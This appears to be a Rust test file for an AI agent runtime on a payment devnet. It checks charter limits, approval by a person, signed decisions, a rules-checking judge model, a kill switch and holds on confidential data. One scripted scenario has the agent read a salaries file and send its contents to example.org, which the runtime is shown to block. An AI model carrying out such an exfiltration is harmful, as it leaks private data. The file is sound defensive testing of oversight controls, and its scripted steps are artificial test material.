//! An agent at work on a devnet: a scripted model drives the runtime, which
//! pays through the agent's charter. The ledger refuses what the charter
//! forbids whatever the runtime allows; the runtime asks before paying at
//! autonomy L5, each payment on its own, and a person may allow calls like
//! one they approve for the rest of the session; the kill switch stops a
//! run.

use std::sync::Arc;

use serde_json::json;
use sion_agent::{Autonomy, Ended, Policy};
use sion_cli::runtime::{self, SharedLedger};
use sion_cli::session::Session;
use sion_core::ids::{AssetId, Pulse};
use sion_core::Amount;
use sion_exec::charter::Caveats;
use sion_exec::execute::Event;
use sion_exec::TxKind;
use sion_node::{Devnet, DevnetConfig};

fn script(dir: &std::path::Path, name: &str, steps: serde_json::Value) -> String {
    let path = dir.join(name);
    std::fs::write(&path, steps.to_string()).unwrap();
    format!("script:{}", path.display())
}

#[test]
fn an_agent_pays_within_its_charter_and_asks_when_told_to() {
    let home = std::env::temp_dir().join(format!("sion-agent-runtime-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&home);
    std::fs::create_dir_all(&home).unwrap();
    // The only test in this binary, so the environment is its own.
    std::env::set_var("SION_HOME", &home);

    let devnet = Arc::new(
        Devnet::start(DevnetConfig {
            rounds_per_pulse: 2,
            prove_chunk: None,
            ..DevnetConfig::default()
        })
        .unwrap(),
    );
    let ledger: SharedLedger = devnet.clone();
    let mut session = Session::open(ledger.as_ref()).unwrap();
    session
        .fund("alice", AssetId::usd(), Amount::units(1_000))
        .unwrap();

    // alice gives agent-7 an identity: it may pay only bob, at most 10 USD
    // a payment, from a budget of 100 USD.
    let bob = session.id("bob");
    let account = session.id("agent-7");
    let pulse = sion_cli::ledger::LedgerExt::pulse(ledger.as_ref()).unwrap();
    let view = session
        .must(
            "alice",
            TxKind::RegisterAgent {
                agent: account,
                card: sion_core::hash::Hash32::ZERO,
                caveats: Caveats {
                    payees: Some([bob].into()),
                    max_per_payment: Amount::units(10),
                    burst: Amount::units(50),
                    rate: Amount(50_000),
                    expires_at: Pulse(pulse.0 + 100_000),
                    evidence_above: None,
                    evidence_policy: sion_assurance::Policy::standard(),
                    receipts: true,
                    may_delegate: false,
                },
                funding: Amount::units(100),
                agent_bond: Amount::ZERO,
            },
            Vec::new(),
        )
        .unwrap();
    let agent = view
        .effects
        .events
        .iter()
        .find_map(|e| match e {
            Event::AgentRegistered { agent, .. } => Some(*agent),
            _ => None,
        })
        .expect("an agent was registered");
    // Its account pays the fees of its transactions.
    session
        .fund("agent-7", AssetId::usd(), Amount::units(1))
        .unwrap();
    let bob_before = session.balance("bob", AssetId::usd()).unwrap();

    // At L6 the runtime lets every call through; the ledger still refuses
    // a payee the charter does not allow and an amount above its limit.
    let model = script(
        &home,
        "pay.json",
        json!([
            {"call": "ledger_balance"},
            {"call": "ledger_pay", "input": {"to": "bob", "amount": "5", "purpose": "inference"}},
            {"call": "ledger_pay", "input": {"to": "carol", "amount": "5", "purpose": "a tip"}},
            {"call": "ledger_pay", "input": {"to": "bob", "amount": "50", "purpose": "a big order"}},
            {"say": "Paid bob 5 USD; the ledger refused the other two payments."}
        ]),
    );
    let policy = Policy {
        autonomy: Autonomy::L6,
        ..Policy::default()
    };
    let (saved, lines) = runtime::start(
        ledger.clone(),
        "agent-7",
        agent,
        "Pay bob 5 USD for inference.",
        vec![model],
        policy,
        Default::default(),
    )
    .unwrap();
    let text = lines.join("\n");
    assert!(matches!(saved.ended, Some(Ended::Done { .. })), "{text}");
    assert_eq!(
        text.matches("refused by the ledger").count(),
        2,
        "two payments refused by the ledger:\n{text}"
    );
    assert!(text.contains(r#""budget_remaining_usd":"100""#), "{text}");
    let bob_after = session.balance("bob", AssetId::usd()).unwrap();
    assert_eq!(bob_after.0 - bob_before.0, Amount::units(5).0, "{text}");
    assert!(saved.path().exists());
    let trace = sion_agent::trace::chat_line(&saved.state, &saved.system, saved.ended.as_ref());
    assert!(trace.contains("ledger_pay"));

    // The payment noted its transaction before it was sent. Had its outcome
    // been lost, the ledger says what it did: done, so it is not made
    // again; a transaction past its last Pulse never will be, so it may be;
    // one whose last Pulse is not known cannot be told yet.
    let (key, paid) = saved
        .state
        .journal
        .entries()
        .iter()
        .find(|(_, e)| e.tool == "ledger_pay" && !e.outcome.is_error)
        .expect("the payment was journaled");
    assert_eq!(paid.notes.len(), 1, "{:?}", paid.notes);
    assert!(
        paid.notes[0].starts_with("transaction "),
        "{:?}",
        paid.notes
    );
    assert!(
        paid.notes[0].contains(" may execute until Pulse "),
        "{:?}",
        paid.notes
    );
    let tool = runtime::PayTool(runtime::Acting {
        ledger: ledger.clone(),
        wallet: "agent-7".into(),
        agent,
        evidence: None,
        project: None,
    });
    use sion_agent::Tool;
    assert_eq!(tool.dedup(), sion_agent::Dedup::Reconciled);
    let found = tool
        .reconcile(&paid.input, key, &paid.notes)
        .expect("found on the ledger");
    assert!(found.certain && !found.is_error, "{found:?}");
    assert!(
        found.content.contains("Found on the ledger"),
        "{}",
        found.content
    );
    let never = vec![format!(
        "transaction {} may execute until Pulse 1",
        "00".repeat(32)
    )];
    let gone = tool
        .reconcile(&paid.input, key, &never)
        .expect("past its last Pulse");
    assert!(gone.certain && gone.is_error, "{gone:?}");
    assert!(
        gone.content.starts_with("never executed"),
        "{}",
        gone.content
    );
    let unsure = vec![format!("transaction {}", "00".repeat(32))];
    assert_eq!(tool.reconcile(&paid.input, key, &unsure), None);
    // Its steps, as OpenTelemetry spans.
    let otel = sion_agent::trace::otel(&saved.state, "agent-7", saved.ended.as_ref());
    let spans = otel["resourceSpans"][0]["scopeSpans"][0]["spans"].to_string();
    assert!(spans.contains("execute_tool ledger_pay"), "{spans}");
    assert!(
        spans.contains(r#"{"key":"sion.effect","value":{"stringValue":"spend"}}"#),
        "{spans}"
    );

    // At L5 a payment waits for a person; approved, it is made once.
    let model = script(
        &home,
        "ask.json",
        json!([
            {"call": "ledger_pay", "input": {"to": "bob", "amount": "3", "purpose": "data"}},
            {"say": "Paid bob 3 USD."}
        ]),
    );
    let policy = Policy {
        autonomy: Autonomy::L5,
        ..Policy::default()
    };
    let (mut saved, lines) = runtime::start(
        ledger.clone(),
        "agent-7",
        agent,
        "Pay bob 3 USD for data.",
        vec![model],
        policy,
        Default::default(),
    )
    .unwrap();
    assert!(
        matches!(saved.ended, Some(Ended::NeedsApproval { .. })),
        "{}",
        lines.join("\n")
    );
    assert_eq!(session.balance("bob", AssetId::usd()).unwrap(), bob_after);
    // The session is kept on disk and continues from there.
    let mut saved_again = runtime::Saved::load(&saved.state.id[..6]).unwrap();
    assert_eq!(saved_again.state, saved.state);
    let request = saved_again
        .state
        .pending
        .as_ref()
        .unwrap()
        .request()
        .to_string();
    assert!(
        lines
            .last()
            .unwrap()
            .contains(&format!("request {request}")),
        "{}",
        lines.join("\n")
    );
    // A decision names the request it decides, if it names one; a payment
    // is approved on its own, never for the rest of the session.
    let approve = |words: &str| runtime::Reply::Approve(runtime::Approval::parse(words).unwrap());
    let wrong = saved_again
        .decide_as(&approve("00000000"), "alice")
        .unwrap_err()
        .to_string();
    assert!(
        wrong.contains("not the one the session waits on"),
        "{wrong}"
    );
    let always = saved_again
        .decide_as(&approve(&format!("{request} always")), "alice")
        .unwrap_err()
        .to_string();
    assert!(always.contains("one at a time"), "{always}");
    saved_again.decide_as(&approve(&request), "alice").unwrap();
    // The decision is signed with a wallet of the person's own; a devnet
    // name, whose keys anyone can derive from it, does not sign.
    let unkeyed = saved_again.sign_decision("alice").unwrap_err().to_string();
    assert!(unkeyed.contains("no key of its own"), "{unkeyed}");
    std::fs::create_dir_all(sion_cli::session::wallet_dir()).unwrap();
    std::fs::write(
        sion_cli::session::wallet_dir().join("approver.seed"),
        "42".repeat(32),
    )
    .unwrap();
    saved_again.sign_decision("approver").unwrap();
    let lines = saved_again.run(ledger.clone()).unwrap();
    assert!(
        matches!(saved_again.ended, Some(Ended::Done { .. })),
        "{}",
        lines.join("\n")
    );
    assert!(
        lines
            .iter()
            .any(|l| l.contains("ledger_pay") && l.contains("(approved by alice)")),
        "{}",
        lines.join("\n")
    );
    let decided = &saved_again.state.decisions;
    assert_eq!(
        (
            decided.len(),
            decided[0].by.as_str(),
            decided[0].request.as_str()
        ),
        (1, "alice", request.as_str())
    );
    // The signature holds over the decision as it is recorded and the call
    // in the session; a decision changed after it was signed does not.
    let checked = runtime::decision_lines(&saved_again);
    assert!(
        checked[0].contains("approved by alice")
            && checked[0].contains("signed by wallet approver")
            && checked[0].contains("the signature holds, over the call in the session"),
        "{checked:?}"
    );
    let mut forged = saved_again.clone();
    forged.state.decisions[0].by = "mallory".into();
    let forged = runtime::decision_lines(&forged);
    assert!(
        forged[0].contains("its signature does not hold"),
        "{forged:?}"
    );
    // A session whose agent says what it expects of its calls (`--expect`)
    // keeps that with the call in its conversation, and the person decides
    // the call as its tool is given it: the signature is still found to be
    // over the call in the session.
    let mut expecting = saved_again.clone();
    for message in &mut expecting.state.messages {
        for block in &mut message.content {
            if let sion_agent::Block::ToolUse { name, input, .. } = block {
                if name == "ledger_pay" {
                    input["expect"] = json!({"outcome": "bob is paid"});
                }
            }
        }
    }
    let unread = runtime::decision_lines(&expecting);
    assert!(unread[0].contains("no longer in the session"), "{unread:?}");
    expecting.state.expecting = true;
    let read = runtime::decision_lines(&expecting);
    assert!(
        read[0].contains("the signature holds, over the call in the session"),
        "{read:?}"
    );
    assert_eq!(
        session.balance("bob", AssetId::usd()).unwrap().0 - bob_after.0,
        Amount::units(3).0
    );
    // Deciding again has nothing to decide.
    assert!(saved_again.decide(true, "").is_err());
    let _ = saved.decide(false, "too late");

    // At L2 each write waits for a person, who may allow the writes a rule
    // matches for the rest of the session: those run without asking, and
    // say so; another still waits.
    // The workspace is apart from the agent's home, as the runtime requires.
    let workspace =
        std::env::temp_dir().join(format!("sion-agent-runtime-work-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&workspace);
    let model = script(
        &home,
        "notes.json",
        json!([
            {"call": "write_file", "input": {"path": "notes/a.txt", "content": "a"}},
            {"call": "write_file", "input": {"path": "notes/b.txt", "content": "b"}},
            {"call": "write_file", "input": {"path": "plan.txt", "content": "c"}},
            {"say": "Wrote the notes."}
        ]),
    );
    let (mut notes, _) = runtime::start(
        ledger.clone(),
        "agent-7",
        agent,
        "Write the notes.",
        vec![model],
        Policy {
            autonomy: Autonomy::L2,
            ..Policy::default()
        },
        runtime::Equipment {
            workspace: Some(workspace.clone()),
            ..Default::default()
        },
    )
    .unwrap();
    assert!(matches!(notes.ended, Some(Ended::NeedsApproval { .. })));
    let mismatch = notes
        .decide_as(&approve("always write_file(plan:*)"), "alice")
        .unwrap_err()
        .to_string();
    assert!(mismatch.contains("does not match"), "{mismatch}");
    notes
        .decide_as(&approve("always write_file(notes:*)"), "alice")
        .unwrap();
    let lines = notes.run(ledger.clone()).unwrap();
    let Some(Ended::NeedsApproval { input, .. }) = &notes.ended else {
        panic!("{}", lines.join("\n"));
    };
    assert_eq!(input["path"], "plan.txt");
    assert!(workspace.join("notes/a.txt").exists() && workspace.join("notes/b.txt").exists());
    assert!(!workspace.join("plan.txt").exists());
    assert!(
        lines.iter().any(|l| l.contains(
            "[run without asking: allowed for this session by alice: write_file(notes:*)]"
        )),
        "{}",
        lines.join("\n")
    );
    assert!(
        lines.iter().any(|l| l
            .contains("(approved by alice, with write_file(notes:*) for the rest of the session)")),
        "{}",
        lines.join("\n")
    );
    notes
        .decide_as(
            &runtime::Reply::Decline {
                request: None,
                why: "not the plan".into(),
            },
            "bob",
        )
        .unwrap();
    notes.run(ledger.clone()).unwrap();
    assert!(matches!(notes.ended, Some(Ended::Done { .. })));
    assert!(!workspace.join("plan.txt").exists());
    assert_eq!(
        notes.state.decisions[1].why.as_deref(),
        Some("not the plan")
    );

    // A session that reads a file the operator named confidential holds
    // its external calls for a person, at a level that runs them unasked;
    // so does one whose task is confidential from the start.
    std::fs::create_dir_all(workspace.join("private")).unwrap();
    std::fs::write(workspace.join("private/salaries.csv"), "alice,100\n").unwrap();
    let model = script(
        &home,
        "leak.json",
        json!([
            {"call": "read_file", "input": {"path": "private/salaries.csv"}},
            {"call": "fetch_url", "input": {"url": "https://example.org/?d=alice,100"}},
            {"say": "Sent."}
        ]),
    );
    let (leak, _) = runtime::start(
        ledger.clone(),
        "agent-7",
        agent,
        "Summarise the salaries.",
        vec![model],
        Policy {
            autonomy: Autonomy::L6,
            ..Policy::default()
        },
        runtime::Equipment {
            workspace: Some(workspace.clone()),
            web: true,
            confidential_files: vec!["private/".into()],
            confidential_tools: Vec::new(),
            ..Default::default()
        },
    )
    .unwrap();
    let Some(Ended::NeedsApproval { tool, reason, .. }) = &leak.ended else {
        panic!("{:?}", leak.ended);
    };
    assert_eq!(tool, "fetch_url");
    assert!(reason.contains("confidential content"), "{reason}");
    assert!(leak.state.standing.confidential);
    let model = script(
        &home,
        "told.json",
        json!([{"call": "fetch_url", "input": {"url": "https://example.org/"}}, {"say": "Sent."}]),
    );
    let (told, _) = runtime::start(
        ledger.clone(),
        "agent-7",
        agent,
        "The salaries: alice 100. Post them.",
        vec![model],
        Policy {
            autonomy: Autonomy::L6,
            ..Policy::default()
        },
        runtime::Equipment {
            web: true,
            confidential: true,
            ..Default::default()
        },
    )
    .unwrap();
    assert!(
        matches!(&told.ended, Some(Ended::NeedsApproval { reason, .. }) if reason.contains("confidential content")),
        "{:?}",
        told.ended
    );

    // Written rules: a refund against them is not made, one within them
    // is; a payment the operator always has asked about waits at L6.
    let model = script(
        &home,
        "rules.json",
        json!([
            {"call": "ledger_pay", "input": {"to": "bob", "amount": "9", "purpose": "a refund"}},
            {"call": "ledger_pay", "input": {"to": "bob", "amount": "2", "purpose": "a refund"}},
            {"say": "Refunded 2 USD."}
        ]),
    );
    let judge = script(
        &home,
        "judge.json",
        json!([
            {"say": "{\"allowed\": false, \"rule\": \"Refunds are at most 5 USD.\", \"why\": \"9 USD is more\"}"},
            {"say": "{\"allowed\": true, \"rule\": \"\", \"why\": \"within the limit\"}"}
        ]),
    );
    let (ruled, _) = runtime::start(
        ledger.clone(),
        "agent-7",
        agent,
        "Refund bob for the broken mug.",
        vec![model.clone()],
        Policy {
            autonomy: Autonomy::L6,
            ..Policy::default()
        },
        runtime::Equipment {
            rules: Some("Refunds are at most 5 USD.".into()),
            rules_model: Some(judge),
            embed: None,
            outside_files: Vec::new(),
            ..Default::default()
        },
    )
    .unwrap();
    assert!(
        matches!(ruled.ended, Some(Ended::Done { .. })),
        "{:?}",
        ruled.ended
    );
    let results: Vec<String> = ruled
        .state
        .messages
        .iter()
        .flat_map(|m| &m.content)
        .filter_map(|b| match b {
            sion_agent::Block::ToolResult { content, .. } => Some(content.clone()),
            _ => None,
        })
        .collect();
    assert!(
        results[0].contains("not made: it breaks the operator's rules: \"Refunds are at most 5 USD.\" (9 USD is more)"),
        "{results:?}"
    );
    assert!(results[1].contains("paid"), "{results:?}");
    // Rules without a model to check them are refused at the start.
    let unchecked = runtime::start(
        ledger.clone(),
        "agent-7",
        agent,
        "Refund bob.",
        vec![model.clone()],
        Policy::default(),
        runtime::Equipment {
            rules: Some("Refunds are at most 5 USD.".into()),
            ..Default::default()
        },
    );
    assert!(unchecked.is_err_and(|e| e.to_string().contains("--rules-model")));
    let (held, _) = runtime::start(
        ledger.clone(),
        "agent-7",
        agent,
        "Refund bob for the broken mug.",
        vec![model],
        Policy {
            autonomy: Autonomy::L6,
            always_ask: vec![sion_agent::permissions::ToolRule::parse("ledger_pay").unwrap()],
            ..Policy::default()
        },
        Default::default(),
    )
    .unwrap();
    assert!(
        matches!(&held.ended, Some(Ended::NeedsApproval { reason, .. }) if reason.contains("the operator has ledger_pay always wait for a person")),
        "{:?}",
        held.ended
    );

    // A question for the person ends the run with it; their answer goes on.
    let model = script(
        &home,
        "ask.json",
        json!([
            {"call": "ask_person", "input": {"question": "How much was the mug?"}},
            {"say": "Then I will refund 4 USD."}
        ]),
    );
    let (mut asking, lines) = runtime::start(
        ledger.clone(),
        "agent-7",
        agent,
        "Refund bob for the broken mug.",
        vec![model],
        Policy::default(),
        runtime::Equipment {
            ask: true,
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(
        asking.ended,
        Some(Ended::Asked {
            question: "How much was the mug?".into()
        })
    );
    let text = lines.join("\n");
    assert!(
        text.contains(&format!(
            "session {}: asks you: How much was the mug?; answer with `sion agent continue {} --say <answer>`",
            asking.state.id, asking.state.id
        )),
        "{text}"
    );
    assert_eq!(runtime::last_words(&asking), "How much was the mug?");
    asking.state.tell("4 USD.", &asking.limits);
    asking.run(ledger.clone()).unwrap();
    assert!(
        matches!(&asking.ended, Some(Ended::Done { text }) if text == "Then I will refund 4 USD.")
    );

    // The kill switch stops a run before its first call.
    std::fs::create_dir_all(runtime::kill_switch().parent().unwrap()).unwrap();
    std::fs::write(runtime::kill_switch(), "stop").unwrap();
    let model = script(
        &home,
        "stopped.json",
        json!([{"call": "ledger_pay", "input": {"to": "bob", "amount": "1", "purpose": "never"}}]),
    );
    let (saved, _) = runtime::start(
        ledger.clone(),
        "agent-7",
        agent,
        "Pay bob 1 USD.",
        vec![model],
        Policy {
            autonomy: Autonomy::L6,
            ..Policy::default()
        },
        Default::default(),
    )
    .unwrap();
    assert_eq!(saved.ended, Some(Ended::Stopped));
    std::fs::remove_file(runtime::kill_switch()).unwrap();

    // A wallet that is not the agent's account cannot act as the agent.
    let wrong = runtime::start(
        ledger,
        "mallory",
        agent,
        "Pay me.",
        vec!["script:/dev/null".into()],
        Policy::default(),
        Default::default(),
    );
    assert!(wrong.is_err());
    std::fs::remove_dir_all(&home).unwrap();
    std::fs::remove_dir_all(&workspace).unwrap();
}
